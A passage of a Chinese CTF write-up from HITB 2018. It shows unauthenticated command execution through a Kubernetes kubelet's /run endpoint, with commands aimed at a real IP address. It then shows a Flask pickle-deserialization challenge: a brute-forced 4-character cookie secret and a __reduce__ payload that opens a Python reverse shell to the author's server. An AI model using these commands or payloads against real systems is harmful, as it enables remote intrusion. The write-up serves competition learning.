class="line">        &#125;</span><br><span class="line">    ], </span><br><span class="line">    &quot;kind&quot;: &quot;PodList&quot;, </span><br><span class="line">    &quot;metadata&quot;: &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>不难看到关键点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&quot;metadata&quot;: &#123;</span><br><span class="line">                &quot;creationTimestamp&quot;: null, </span><br><span class="line">                &quot;name&quot;: &quot;web-test-4092782360-035qx&quot;, </span><br><span class="line">                &quot;namespace&quot;: &quot;esn-system&quot;, </span><br><span class="line">                &quot;uid&quot;: &quot;a8f7e307-3e14-11e8-838a-00163e0245e7&quot;</span><br><span class="line">            &#125;, </span><br><span class="line">            &quot;spec&quot;: &#123;</span><br><span class="line">                &quot;containers&quot;: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;image&quot;: &quot;127.0.0.1:5000/esn-containers/web_test@sha256:ae129fcd94bd2978db37050f95c62311f5bf9fdbba25817e6e8a098db3a168cf&quot;, </span><br><span class="line">                        &quot;name&quot;: &quot;web-test&quot;, </span><br><span class="line">                        &quot;resources&quot;: &#123;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里可以看到几个关键点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pod_name:web-test-4092782360-035qx</span><br><span class="line">namespace:esn-system</span><br><span class="line">container_name:web-test</span><br></pre></td></tr></table></figure></p>
+<p>故此可以使用指令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http --form --verify=no POST https://目标ip:port/run/namespace/pod_name/container_name cmd=&apos;ls /&apos;</span><br></pre></td></tr></table></figure></p>
+<p>即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http --form --verify=no POST https://47.75.146.42:10250/run/esn-system/web-test-4092782360-035qx/web-test cmd=&apos;ls /&apos;</span><br></pre></td></tr></table></figure></p>
+<p>进行命令执行<br>回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Length: 101</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Date: Thu, 12 Apr 2018 07:01:06 GMT</span><br><span class="line"></span><br><span class="line">bin</span><br><span class="line">core</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag.txt</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">linuxrc</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">start.sh</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure></p>
+<p>发现成功读取根目录信息<br>我们直接<code>cat flag</code><br>即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http --form --verify=no POST https://47.75.146.42:10250/run/esn-system/web-test-4092782360-035qx/web-test cmd=&apos;cat /flag.txt&apos;</span><br></pre></td></tr></table></figure></p>
+<p>得到回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Length: 176</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Date: Thu, 12 Apr 2018 07:00:53 GMT</span><br><span class="line"></span><br><span class="line">HITB&#123;KKKKKKKKKKKKKKKKKKKKKKKKK&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DO NOT MODIFY ANYTHING.</span><br><span class="line">WE WILL BAN YOUR TEAM IF YOU CHANG FLAG, DELETE FILES, ETC.</span><br><span class="line"></span><br><span class="line">如果你修改、删除文件，我们会 ban 掉你 :D</span><br></pre></td></tr></table></figure></p>
+<p>故此拿到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HITB&#123;KKKKKKKKKKKKKKKKKKKKKKKKK&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="Python’s-revenge"><a href="#Python’s-revenge" class="headerlink" title="Python’s revenge"></a>Python’s revenge</h2><p>题目直接给出了源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> unicode_literals</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response, redirect, url_for, session</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, flash, redirect, url_for, request</span><br><span class="line"><span class="keyword">from</span> werkzeug.security <span class="keyword">import</span> safe_str_cmp</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">as</span> b64d</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> b64e</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> filecmp</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> linecache</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> dircache</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line"><span class="keyword">import</span> popen2</span><br><span class="line"><span class="keyword">import</span> code</span><br><span class="line"><span class="keyword">import</span> codeop</span><br><span class="line"><span class="keyword">import</span> pty</span><br><span class="line"><span class="keyword">import</span> posixfile</span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="string">'you will never guess'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'.secret'</span>):</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">".secret"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        secret = <span class="string">''</span>.join(random.choice(string.ascii_letters + string.digits)</span><br><span class="line">                         <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>))</span><br><span class="line">        f.write(secret)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">".secret"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cookie_secret = f.read().strip()</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_object(__name__)</span><br><span class="line"></span><br><span class="line">black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span><span class="params">()</span>:</span></span><br><span class="line">    session[<span class="string">'cnt'</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    remembered_str = <span class="string">'Hello, here\'s what we remember for you. And you can change, delete or extend it.'</span></span><br><span class="line">    new_str = <span class="string">'Hello fellow zombie, have you found a tasty brain and want to remember where? Go right here and enter it:'</span></span><br><span class="line">    location = getlocation()</span><br><span class="line">    <span class="keyword">if</span> location == <span class="keyword">False</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">"clear"</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, txt=remembered_str, location=location)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/clear')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear</span><span class="params">()</span>:</span></span><br><span class="line">    flash(<span class="string">"Reminder cleared!"</span>)</span><br><span class="line">    response = redirect(url_for(<span class="string">'home'</span>))</span><br><span class="line">    response.set_cookie(<span class="string">'location'</span>, max_age=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/reminder', methods=['POST', 'GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reminder</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        location = request.form[<span class="string">"reminder"</span>]</span><br><span class="line">        <span class="keyword">if</span> location == <span class="string">''</span>:</span><br><span class="line">            flash(<span class="string">"Message cleared, tell us when you have found more brains."</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">"We will remember where you find your brains."</span>)</span><br><span class="line">        location = b64e(pickle.dumps(location))</span><br><span class="line">        cookie = make_cookie(location, cookie_secret)</span><br><span class="line">        response = redirect(url_for(<span class="string">'home'</span>))</span><br><span class="line">        response.set_cookie(<span class="string">'location'</span>, cookie)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    location = getlocation()</span><br><span class="line">    <span class="keyword">if</span> location == <span class="keyword">False</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">"clear"</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'reminder.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FilterException</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        super(FilterException, self).__init__(</span><br><span class="line">            <span class="string">'The callable object &#123;value&#125; is not allowed'</span>.format(value=str(value)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TimesException</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(TimesException, self).__init__(</span><br><span class="line">            <span class="string">'Call func too many times!'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_hook_call</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        session[<span class="string">'cnt'</span>] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> session[<span class="string">'cnt'</span>]</span><br><span class="line">        <span class="keyword">print</span> args[<span class="number">0</span>].stack</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> args[<span class="number">0</span>].stack:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> black_type_list:</span><br><span class="line">                <span class="keyword">raise</span> FilterException(args[<span class="number">0</span>].stack[<span class="number">-2</span>])</span><br><span class="line">            <span class="keyword">if</span> session[<span class="string">'cnt'</span>] &gt; <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">raise</span> TimesException()</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(strs)</span>:</span></span><br><span class="line">    reload(pickle)</span><br><span class="line">    files = StringIO(strs)</span><br><span class="line">    unpkler = pickle.Unpickler(files)</span><br><span class="line">    unpkler.dispatch[pickle.REDUCE] = _hook_call(</span><br><span class="line">        unpkler.dispatch[pickle.REDUCE])</span><br><span class="line">    <span class="keyword">return</span> unpkler.load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getlocation</span><span class="params">()</span>:</span></span><br><span class="line">    cookie = request.cookies.get(<span class="string">'location'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    (digest, location) = cookie.split(<span class="string">"!"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> safe_str_cmp(calc_digest(location, cookie_secret), digest):</span><br><span class="line">        flash(<span class="string">"Hey! This is not a valid cookie! Leave me alone."</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    location = loads(b64d(location))</span><br><span class="line">    <span class="keyword">return</span> location</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_cookie</span><span class="params">(location, secret)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"%s!%s"</span> % (calc_digest(location, secret), location)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_digest</span><span class="params">(location, secret)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> sha256(<span class="string">"%s%s"</span> % (location, secret)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, port=<span class="number">5051</span>)</span><br></pre></td></tr></table></figure></p>
+<p>发现与强网杯的类似<br>参考链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://skysec.top/2018/04/01/Python-is-the-best-language/</span><br></pre></td></tr></table></figure></p>
+<p>注意到getlocation()函数中反序列化操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location = loads(b64d(location))</span><br></pre></td></tr></table></figure></p>
+<p>跟location的由来<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">location = request.form[<span class="string">"reminder"</span>]</span><br><span class="line">        <span class="keyword">if</span> location == <span class="string">''</span>:</span><br><span class="line">            flash(<span class="string">"Message cleared, tell us when you have found more brains."</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">"We will remember where you find your brains."</span>)</span><br><span class="line">        location = b64e(pickle.dumps(location))</span><br><span class="line">        cookie = make_cookie(location, cookie_secret)</span><br><span class="line">        response = redirect(url_for(<span class="string">'home'</span>))</span><br><span class="line">        response.set_cookie(<span class="string">'location'</span>, cookie)</span><br></pre></td></tr></table></figure></p>
+<p>然后生成的cookie<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getlocation</span><span class="params">()</span>:</span></span><br><span class="line">    cookie = request.cookies.get(<span class="string">'location'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    (digest, location) = cookie.split(<span class="string">"!"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> safe_str_cmp(calc_digest(location, cookie_secret), digest):</span><br><span class="line">        flash(<span class="string">"Hey! This is not a valid cookie! Leave me alone."</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    location = loads(b64d(location))</span><br></pre></td></tr></table></figure></p>
+<p>最后发现只要能控制cookie即可随意更改反序列化的值<br>但是问题来了，没有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie_secret</span><br></pre></td></tr></table></figure></p>
+<p>跟一下发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if not os.path.exists(&apos;.secret&apos;):</span><br><span class="line">    with open(&quot;.secret&quot;, &quot;w&quot;) as f:</span><br><span class="line">        secret = &apos;&apos;.join(random.choice(string.ascii_letters + string.digits)</span><br><span class="line">                         for x in range(4))</span><br><span class="line">        f.write(secret)</span><br><span class="line">with open(&quot;.secret&quot;, &quot;r&quot;) as f:</span><br><span class="line">    cookie_secret = f.read().strip()</span><br></pre></td></tr></table></figure></p>
+<p>cookie_secret只有4位的长度，很快就能爆破出来<br>我们写脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">as</span> b64d</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> b64e</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_cookie</span><span class="params">(location, secret)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"%s!%s"</span> % (calc_digest(location, secret), location)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_digest</span><span class="params">(location, secret)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> sha256(<span class="string">"%s%s"</span> % (location, secret)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x1 <span class="keyword">in</span> string.ascii_letters + string.digits:</span><br><span class="line">    <span class="keyword">for</span> x2 <span class="keyword">in</span> string.ascii_letters + string.digits:</span><br><span class="line">        <span class="keyword">for</span> x3 <span class="keyword">in</span> string.ascii_letters + string.digits:</span><br><span class="line">            <span class="keyword">for</span> x4 <span class="keyword">in</span> string.ascii_letters + string.digits:</span><br><span class="line">                cookie_secret = x1+x2+x3+x4</span><br><span class="line">                location = <span class="string">"VjExMQpwMAou"</span></span><br><span class="line">                cookie = make_cookie(location, cookie_secret)</span><br><span class="line">                <span class="comment">#print cookie</span></span><br><span class="line">                <span class="keyword">if</span> cookie == <span class="string">"73ec41cd2804d3ad0a606c66d02d9d2234ba4ff0c4dc02f69555157beab99d9f!VjExMQpwMAou"</span>:</span><br><span class="line">                    <span class="keyword">print</span> cookie_secret</span><br><span class="line">                    <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
+<p>运行得到cookie_secret<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hitb</span><br></pre></td></tr></table></figure></p>
+<p>然后就是构造类，bypass沙盒黑名单了<br>注意到黑名单未过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">platform.popen</span><br></pre></td></tr></table></figure></p>
+<p>于是构造类<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exploit</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line"> 		<span class="keyword">return</span> (platform.popen,(<span class="string">"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",23333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"</span>,)) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serialize_exploit</span><span class="params">()</span>:</span></span><br><span class="line">    shellcode = pickle.dumps(Exploit())</span><br><span class="line">    <span class="keyword">return</span> shellcode</span><br></pre></td></tr></table></figure></p>
+<p>最后脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> b64e</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_cookie</span><span class="params">(location, secret)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"%s!%s"</span> % (calc_digest(location, secret), location)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_digest</span><span class="params">(location, secret)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> sha256(<span class="string">"%s%s"</span> % (location, secret)).hexdigest()</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exploit</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line"> 		<span class="keyword">return</span> (platform.popen,(<span class="string">"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"你的vps\",23333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"</span>,)) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serialize_exploit</span><span class="params">()</span>:</span></span><br><span class="line">    shellcode = pickle.dumps(Exploit())</span><br><span class="line">    <span class="keyword">return</span> shellcode</span><br><span class="line"></span><br><span class="line">location = b64e(serialize_exploit())</span><br><span class="line">cookie_secret = <span class="string">"hitb"</span></span><br><span class="line">cookie = make_cookie(location, cookie_secret)</span><br><span class="line"><span class="keyword">print</span> cookie</span><br></pre></td></tr></table></figure></p>
